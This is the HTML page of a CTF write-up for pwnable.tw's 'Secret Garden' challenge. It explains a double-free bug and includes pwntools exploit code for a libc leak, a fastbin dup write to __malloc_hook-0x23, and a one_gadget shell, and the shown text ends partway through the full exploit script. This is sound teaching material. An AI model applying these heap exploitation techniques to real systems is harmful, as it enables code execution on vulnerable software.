<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - Secret Garden - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="#Challange Description          Name Secret Garden   Points 350   Solves 458 times   Libc 2.23   Category Exploitation   Description Find the flag in the garden"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - Secret Garden"><meta property="og:url" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="#Challange Description          Name Secret Garden   Points 350   Solves 458 times   Libc 2.23   Category Exploitation   Description Find the flag in the garden"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/protection.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/challenge_binary.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/vuln.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk_bypass.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget_execve.png"><meta property="og:image" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/flag.png"><meta property="article:published_time" content="2020-06-12T18:30:00.000Z"><meta property="article:modified_time" content="2024-09-20T11:16:48.163Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="WarGames"><meta property="article:tag" content="Heap Exploitation"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/protection.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/"},"headline":"Binary Exploitation [pwnable.tw] - Secret Garden","image":["https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/protection.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/challenge_binary.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/vuln.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk_bypass.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget_execve.png","https://www.taintedbits.com/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/flag.png"],"datePublished":"2020-06-12T18:30:00.000Z","dateModified":"2024-09-20T11:16:48.163Z","author":{"@type":"Person","name":"D3xt3r"},"publisher":{"@type":"Organization","name":"Tainted Bits","logo":{"@type":"ImageObject","url":"https://www.taintedbits.com/images/logo-header.png"}},"description":"#Challange Description          Name Secret Garden   Points 350   Solves 458 times   Libc 2.23   Category Exploitation   Description Find the flag in the garden"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><!--!--><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'UA-128181439-1');</script><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-06-12T18:30:00.000Z" title="13/6/2020, 12:00:00 am">2020-06-13</time></span><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - Secret Garden</h1><div class="content"><h2 id="Challange-Description"><a class="header-anchor" href="#Challange-Description">#</a>Challange Description</h2>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Name</td>
<td>Secret Garden</td>
</tr>
<tr>
<td>Points</td>
<td>350</td>
</tr>
<tr>
<td>Solves</td>
<td>458 times</td>
</tr>
<tr>
<td>Libc</td>
<td>2.23</td>
</tr>
<tr>
<td>Category</td>
<td>Exploitation</td>
</tr>
<tr>
<td>Description</td>
<td>Find the flag in the garden</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<p>We are provided with the libc binary used by challenge binary which will be used for calculate offsets of various symbols we need. The version of the libc is 2.23.</p>
<h2 id="Binary-Protection"><a class="header-anchor" href="#Binary-Protection">#</a>Binary Protection</h2>
<p>Once you run a checksec on the binary you get the following results</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/protection.png" alt="" /></p>
<h2 id="Vulnerable-Application"><a class="header-anchor" href="#Vulnerable-Application">#</a>Vulnerable Application</h2>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/challenge_binary.png" alt="" /></p>
<p>The application is pretty simple, you can create a flower object which is part of a garden. A flower object can be removed from the garden by first marking it as ready to freed and then by selecting <em>clear the garden</em> option you can free all the flower objects. The flower object is struct which looks like:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flower</span> &#123;</span></span><br><span class="line">  <span class="type">long</span> is_used;   <span class="comment">// is the object currently been used</span></span><br><span class="line">  <span class="type">char</span> *name;     <span class="comment">// stores the name of the flower, memory is allocated using malloc</span></span><br><span class="line">  <span class="type">char</span> color[<span class="number">24</span>]; <span class="comment">// color of flower</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let’s look at the functionality little more closely:</p>
<ol>
<li><strong>Raise a flower</strong>: This creates the flower object using malloc request of size <em>0x28</em> and then prompts for the length of the flower name and then for flower name which is also allocated using malloc, this means we can control the malloc size. It then prompts for flower colour which is stored in the struct itself, colour has the fixed size of 24 bytes. There is a limit of creating 100 objects, the limit check is done every time before you create the flower object. The pointers of these flower objects are stored in the global array which can store 100 such pointers.</li>
<li><strong>Visit the garden</strong>: Displays all the flower name along with the colour. It only displays the objects which has the <em>is_used</em> field with value 1. So only the flower objects which are not ready to be freed.</li>
<li><strong>Remove a flower from the garden</strong>: It prompts the user for the index of the flower object you want to free. It then frees the <em>name</em> field of flower object and sets the <em>is_used</em> field to zero. But this functionality doesn’t free’s the flower object.</li>
<li><strong>Clean the garden</strong>: This functionality iterates the global flower object array and frees the objects which have <em>is_used</em> field set as zero.</li>
<li><strong>Leave the garden</strong>: Exit the program.</li>
</ol>
<p>So let’s summarize the constraints of the application:</p>
<ol>
<li>You can control the name field’s allocation size and its content, this can help us to allocate a chunk which upon freeing can end up in malloc’s free bin of our choice.</li>
<li><em>Remove a flower</em> function free’s only the name memory chunk, this gives us the control which we discussed in the previous point. Since you can control the index of the object you are freeing we can do <strong>fastbin double-free attack</strong>.</li>
<li><em>Visit the garden</em> functionality can help to do the address leak, since it displays object so if we can manipulate the name memory chunk pointer we can leak some interesting addresses. But as PIE is enabled we have no way to leak GOT table or any other fixed known location. Alternatiively, we can also use <em>unsorted bin chunk</em> to leak libc address.</li>
</ol>
<h2 id="Vulnerability"><a class="header-anchor" href="#Vulnerability">#</a>Vulnerability</h2>
<p>Now let’s look at the vulnerable part of the code. Below is the code for <strong>Remove the flower function</strong>, there is a double-free vulnerability in the function which is highlighted in the image below.</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/vuln.png" alt="" /></p>
<p>The code checks if the object at the index is not null and if index is less then 100. If these conditions is satisfied it frees the name memory chunk and set the <em>is_used</em> field to zero. But if you try to free the same index again it doesn’t check the <strong>is_used</strong> field of the flower object before freeing the name memory chunk, this can lead to double-free vulnerability, this vulnerability can be used on fastbin memory chunk to create arbitrary write primitives.</p>
<h2 id="The-Leak-Read-Primitive"><a class="header-anchor" href="#The-Leak-Read-Primitive">#</a>The Leak - Read Primitive</h2>
<p>Since the application has ASLR and PIE enabled we will have to do some address leaks to create a reliable exploit. A good target will be leaking the heap’s main <em>arena struct</em> address and, then use that address to calculate the libc base address. Let’s look at this method more detail.</p>
<h3 id="Smallbin-Leak"><a class="header-anchor" href="#Smallbin-Leak">#</a>Smallbin Leak</h3>
<p>The attack is very simple we allocate chuck big enough so that when it is freed it will end-up in the unsorted bin. Since the unsorted bin is a doubly-linked list it stores the address fd, bk pointer of the next free unsorted bins, if it doesn’t have any memory chunk in its list it points to main arena’s bins array address. The first and last chunk of the unsorted bin has pointers to main arena struct. If we can read those pointers we can use it calculate the libc base address.</p>
<p>To carry out this attack we will create a flower object with name memory chuck of size 500 then we will free that name memory chunk. Then we raise another flower with name memory chuck size of 400, this will return the same chunk from unsorted bins. The first 8 bytes of the returned chunk has fd pointer and the next 8 bytes has bk pointer, we will only overwrite first 8 bytes since those bytes has null value as part of pointer address which can block it to print the entire content of the memory. Next, we will print all the flower objects using visit garden function and parse the printed content to get the <em>main arena address</em>. We can use that arena’s address to calculate the libc base by subtracting the offset from the arena struct, the offset value which we have to subtract is <em>0x3c3b78</em>.</p>
<p>Below code execute the step described above.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAA&#x27;</span>, <span class="string">&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">app.raise_flower(<span class="number">100</span>, <span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>, <span class="string">&#x27;CCCCCCCCCCCCCCCC&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line"><span class="comment"># this is the object we will free so that name memory chuck</span></span><br><span class="line"><span class="comment"># end up in unsorted bin</span></span><br><span class="line">app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">app.raise_flower(<span class="number">500</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>, <span class="string">&#x27;BBBBBBBBBBBBBBBB&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free the object</span></span><br><span class="line">app.remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate another object</span></span><br><span class="line">app.raise_flower(<span class="number">400</span>, <span class="string">&#x27;AAAAAAAA&#x27;</span>, <span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print content of all the object, this is where we read the leaked data</span></span><br><span class="line">gd_info = app.visit_garden()</span><br><span class="line"></span><br><span class="line"><span class="comment"># parse the data to extract the main arean address </span></span><br><span class="line">st_idx = gd_info.find(<span class="string">b&#x27;flower[4] :AAAAAAAA&#x27;</span>) + <span class="number">19</span></span><br><span class="line">arena_addr = u64(gd_info[st_idx:st_idx+<span class="number">6</span>] + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Arena addr : &#x27;</span> + <span class="built_in">hex</span>(arena_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calcuate libc base address</span></span><br><span class="line">libc_base_offset = <span class="number">0x3c3b78</span></span><br><span class="line">log.info(<span class="string">&#x27;libc base  : &#x27;</span> + <span class="built_in">hex</span>(arena_addr - libc_base_offset))</span><br></pre></td></tr></table></figure>
<p>Above code will give you libc base address, using the base address and the libc binary provided in the challenge you can calculate the address of different symbols, like system, malloc_hook, free_hook, etc.</p>
<h2 id="Write-Primitive"><a class="header-anchor" href="#Write-Primitive">#</a>Write Primitive</h2>
<p>The next step is figuring out how to overwrite the arbitrary address. For this, we will use <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c">Dup Fastbin attack</a>. This attack trick the malloc to return arbitrary address. Below is the code which does the dup fastbin attack on the binary.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stage_write</span>(<span class="params">write_addr, write_val, bin_size=<span class="number">100</span></span>):</span><br><span class="line">    <span class="string">&#x27;this function overwrites the arbitrary with arbitrary value&#x27;</span></span><br><span class="line">    <span class="comment"># heap groaming for dup fastbin attack</span></span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;AAAAA&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initiate the fastbin attack</span></span><br><span class="line">    app.remove_flower(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># this free is the bypass the double free security check done</span></span><br><span class="line">    <span class="comment"># on fastbin freelist</span></span><br><span class="line">    app.remove_flower(<span class="number">6</span>)</span><br><span class="line">    <span class="comment"># free the same memory chunk again</span></span><br><span class="line">    app.remove_flower(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># at this stage we have fastbin(0x70) with duplicate bins</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># we put the address at which we want to write arbitrary value</span></span><br><span class="line">    app.raise_flower(bin_size, write_addr, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;junk&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># after this allocation the address we want to write will be</span></span><br><span class="line">    <span class="comment"># in fastbin</span></span><br><span class="line">    app.raise_flower(bin_size, <span class="string">&#x27;junk&#x27;</span>, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># this allocation will return the address where want to write</span></span><br><span class="line">    <span class="comment"># the value we want to write is passed in write_val</span></span><br><span class="line">    app.raise_flower(bin_size, write_val, <span class="string">&#x27;BBBBB&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Overwrite complete&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>But the next challenge is what address do we want to overwrite, and with what. A good target would be glibc’s  <strong>__free_hook</strong> and <strong>__malloc_hook</strong>, these methods are called when we do malloc and free functions respectively. We can overwrite the address of this hook with our the shellcode address. So upon calling the malloc/free our shellcode will get triggered. But before doing that there is one more fastbin security check need to take care of, which is described in the next section.</p>
<h3 id="Fastbin-Security-Check-Bypass"><a class="header-anchor" href="#Fastbin-Security-Check-Bypass">#</a>Fastbin Security Check Bypass</h3>
<p>If requested memory chuck can be fulfilled by fastbin, malloc removes the chunk from the fastbin and again calculates fastbin index in which the chunk should be placed. If the chunk cannot be placed back in the fastbin from which it was removed, then malloc throws <strong>“malloc(): memory corruption (fast)”</strong> error.</p>
<p>The fastbin index calculation is done using the size of the memory chunk. Below is the malloc code responsible for the check.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>To bypass this check we need to make sure the whatever address we wish to return from fastbin corruption it need to have a size such that it passes the constrain we just discussed(at -8 offset from the address we put in fastbin).</p>
<p>That been said, earlier we discussed two glibc free and malloc hooks, of the two option we can try to create fake chunk around <strong>__malloc_hook</strong> address because most of the memory around <strong>__free_hook</strong> was null(0). So lets inspect the malloc_hook address with gdb.</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk.png" alt="" /></p>
<p>As you can see the chunk is at address <em>0x7f54e7eb9b10</em> and the size of the chuck is at address 0x7f54e7eb9b00 which has the value 0x7f54e7b7ae50 which is definitely not in fastbin range. But there is one neat trick which we can use to bypass the check, we can search the near-by memory location such that the size field we get is in fastbin range (which is max 0x80). This location is <strong>__malloc_hook-0x23</strong> which you can as below.</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/malloc_hook_fake_chunk_bypass.png" alt="" /></p>
<p>We have changed the alignment of the chuck such that <em>MSB of the size field is 0x7f</em> and the rest of the bytes are 0. So effectively the size of the chuck is 0x7f which is in the fastbin range. So placing <em>__malloc_hook-0x23</em> in freelist will bypass the security check and will return as address near <em>__malloc_hook</em>. With carefully calculated payload we can be overwritten <em>__malloc_hook</em> with the shellcode address. Below is the code for what we just discussed</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook = p64(libc_bin.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">shellcode_addr = <span class="string">&#x27;will figure this out in while&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># function which we just saw</span></span><br><span class="line">stage_write(malloc_hook, p8(<span class="number">0x41</span>)*<span class="number">0x13</span> + shellcode_addr)</span><br></pre></td></tr></table></figure>
<p>So at this stage we have both read and write primitives.</p>
<h2 id="Exploit-Shellcode"><a class="header-anchor" href="#Exploit-Shellcode">#</a>Exploit Shellcode</h2>
<p>Next challenge is we have to figure out the shellcode. Since NX is enabled we will have to find a ROP gadget. The current constraints of the binary remain me of an interesting tool suggested by a friend which does one-shot code execution.</p>
<h3 id="One-Gadget"><a class="header-anchor" href="#One-Gadget">#</a>One Gadget</h3>
<p><a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">one_gadget</a> is tool lets you search for single jump shellcode will leads to call to execve(‘/bin/sh’, NULL, NULL). This perfectly makes sense in our case. Using this tool is very simple, <code>one_gadget &lt;binary&gt;</code> and below is the output of offset where those gadgets can be found. It also prints certain constraints which you need to satisfy to make the gadget work. Below is the output for the libc provided in the challenge.</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget.png" alt="" /></p>
<p>I tried the different offset but <strong>0xef6c4</strong> seems to be working. The constraints can be satisfied by doing double-free on same flower object. Below is the gdb breakpoint on the <em>execve</em> on the function.</p>
<p><img src="/2020/06/13/binary-exploitation-pwnable-tw-level-secretgarden/one_gadget_execve.png" alt="" /></p>
<h2 id="Exploit"><a class="header-anchor" href="#Exploit">#</a>Exploit</h2>
<p>Below is the full working exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Author  : 0xd3xt3r</span></span><br><span class="line"><span class="comment"># Website : taintedbits.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&#x27;./libc_64.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">libc_bin = ELF(libc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10203</span>, timeout=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./secretgarden&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc&#125;, aslr=<span class="literal">True</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>:</span><br><span class="line">    <span class="string">&#x27;This class is used to interact with the application&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, proc</span>):</span><br><span class="line">        self.proc = proc</span><br><span class="line">        self.flower_count = <span class="number">0</span></span><br><span class="line">        self.flower_tmp_clean = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">intro</span>(<span class="params">self</span>):</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">raise_flower</span>(<span class="params">self, <span class="built_in">len</span>, name, color</span>):</span><br><span class="line">        self.proc.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;name :&#x27;</span>)</span><br><span class="line">        self.proc.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;flower :&#x27;</span>)</span><br><span class="line">        self.proc.send(name)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;flower :&#x27;</span>)</span><br><span class="line">        self.proc.sendline(color)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">        self.flower_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_garden</span>(<span class="params">self</span>):</span><br><span class="line">        self.proc.sendline(<span 